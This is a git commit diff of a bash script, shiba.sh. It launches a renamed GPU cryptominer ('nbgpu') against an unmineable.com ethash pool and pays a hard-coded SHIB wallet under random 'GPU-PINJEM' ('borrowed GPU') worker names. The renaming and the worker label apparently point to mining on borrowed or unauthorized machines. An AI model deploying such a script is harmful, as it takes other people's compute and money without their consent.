5047ac578d5e5f7f6412a041aefc41481ec89b7a
angkii <83603708+angkii@users.noreply.github.com>
2021-06-15 19:46:17 +0700

    Update shiba.sh

--- shiba.sh
+++ shiba.sh
@@ -1,3 +1,15 @@
 #!/bin/bash
 
-./nbminer -a ethash -o stratum+tcp://ethash.unmineable.com:3333 -u SHIB:0xb13f91835c32249e1506da1201e937d666652725.tuyulshiba -log
+POOL=ethash.unmineable.com:3333
+
+WALLET=SHIB:0xb13f91835c32249e1506da1201e937d666652725
+
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+
+chmod +x nbgpu
+
+./nbgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
+
+
+
+
